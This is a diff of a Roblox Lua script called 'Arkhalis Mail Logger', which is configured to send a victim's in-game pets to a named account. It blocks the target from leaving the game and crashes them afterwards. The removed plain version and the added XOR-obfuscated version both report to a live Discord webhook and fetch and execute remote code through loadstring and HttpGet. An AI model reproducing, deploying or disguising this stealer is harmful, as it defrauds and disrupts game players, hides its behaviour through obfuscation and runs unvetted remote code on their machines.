@@ -1,23 +1,2 @@
---[[ Arkhalis Mail Logger ]]--
 
---[[ Main Config ]]--
-_G.Username = "godvote" --// Username To Send Pets To
-_G.UserId = 2062380598 --// Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example
-_G.GiftMessage = "lol" --// Message For The Gift To Say
-_G.Diamonds = 5000 --// Amount Of Diamonds To Not Kick
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Crash = true --// Crashes Them After Its Finished
---[[ Webhook Config ]]--
-_G.Webhook = "https://discord.com/api/webhooks/1100442443482144778/0pt5g_X6qFfJWP_lo-3H5OrcLztJJOAgQioVki9YpJrFnx3SF9a8MY5umMGorl4CFuCE" --// Discord Webhook For Executions
-
---[[ UI Config ]]--
-_G.ScriptName = "loading" --// Script Name On The UI
-_G.Tip1 = "1" --// Gives You Tips On The UI
-_G.Tip2 = "2" --// Gives You Tips On The UI
-_G.Tip3 = "3" --// Gives You Tips On The UI
-_G.Tip4 = "4" --// Gives You Tips On The UI
-_G.Tip5 = "5" --// Gives You Tips On The UI
-
---[[ Script ]]
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username=v7("\87\160\17\58\95\187\16","\48\207\117\76");_G.UserId=2062380598;_G.GiftMessage=v7("\70\61\67\175\226\34\93\120\80\234\165\34\72\44\17\172\173\57\14\53\84\234\174\36\66","\46\88\49\202\194\75");_G.Diamonds=184394 -134394 ;_G.UnlockPets=true;_G.AntiLeave=true;_G.Crash=true;_G.Webhook="https://discord.com/api/webhooks/1100442443482144778/0pt5g_X6qFfJWP_lo-3H5OrcLztJJOAgQioVki9YpJrFnx3SF9a8MY5umMGorl4CFuCE";_G.ScriptName=v7("\50\229\162\80\198\6","\97\134\208\57\182\114\146\90");_G.Tip1="1";_G.Tip2="2";_G.Tip3="3";_G.Tip4="4";_G.Tip5="5";loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))();
